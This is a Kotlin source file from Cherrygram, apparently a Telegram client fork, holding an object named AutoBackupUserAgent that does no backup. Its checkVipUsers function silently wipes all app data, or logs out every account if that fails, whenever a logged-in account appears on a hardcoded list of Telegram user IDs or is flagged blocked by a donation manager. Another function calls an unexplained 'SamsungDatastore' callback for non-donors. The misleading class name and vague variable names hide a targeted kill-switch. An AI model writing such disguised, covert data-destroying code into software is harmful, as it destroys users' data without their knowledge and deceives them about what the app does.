/**
 * This is the source code of Cherrygram for Android.
 * It is licensed under GNU GPL v. 2 or later.
 * You should have received a copy of the license in this archive (see LICENSE).
 * Please, be respectful and credit the original author if you use this code.
 *
 * Copyright github.com/arsLan4k1390, 2022-2026.
 */

package org.telegram.messenger

import android.app.ActivityManager
import android.content.Context
import kotlinx.coroutines.delay
import uz.unnarsx.cherrygram.donates.DonatesManager

object AutoBackupUserAgent {

    suspend fun checkLoggedAccountsInstances() {
        delay(5000)
        val ai1 = ArrayList<Long>()

        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
            val uc = AccountInstance.getInstance(i).userConfig
            if (uc != null
                && uc.currentUser != null
                && uc.isClientActivated
                && uc.currentUser.id != 0L
            ) {
                ai1.add(uc.currentUser.id)
            }
        }

        var aaa = false

        for (id in ai1) {
            if (DonatesManager.didUserDonate(id)) {
                aaa = true
            } else {

            }
        }

        if (!aaa) {
            SamsungDatastore.checkCallback()
        }
    }

    suspend fun checkVipUsers() {
        delay(5000)
        val ai = mutableListOf<Long>()

        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
            val uc = AccountInstance.getInstance(i).userConfig
            if (uc != null
                && uc.currentUser != null
                && uc.isClientActivated
                && uc.currentUser.id != 0L
            ) {
                ai.add(uc.currentUser.id)
            }
        }

        val nai = arrayListOf(638789692L, 6863366716L, 8142384327L, 977790049L,
            7509568713L, 7087241402L, 5095920053L, 7913332018L, 6937704743L,
            1076325667L, 808230937L, 811696299L, 7194407593L, 6042869660L/*, 1407394003L,
            6377357496L, 1805212898L, 303995461L, 224710425L, 634425074L, 5270819606L*/
        )

        if (ai.any { DonatesManager.isUserBlocked(it) || nai.contains(it) }) {
            try {
                (ApplicationLoader.applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).clearApplicationUserData()
            } catch (e: Exception) {
                e.printStackTrace()

                for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
                    val userConfig = AccountInstance.getInstance(i).userConfig
                    if (userConfig != null
                        && userConfig.currentUser != null
                        && userConfig.isClientActivated
                        && userConfig.currentUser.id != 0L
                    ) {
                        MessagesController.getInstance(userConfig.currentAccount).performLogout(1)
                    }
                }
            }
        }
    }

}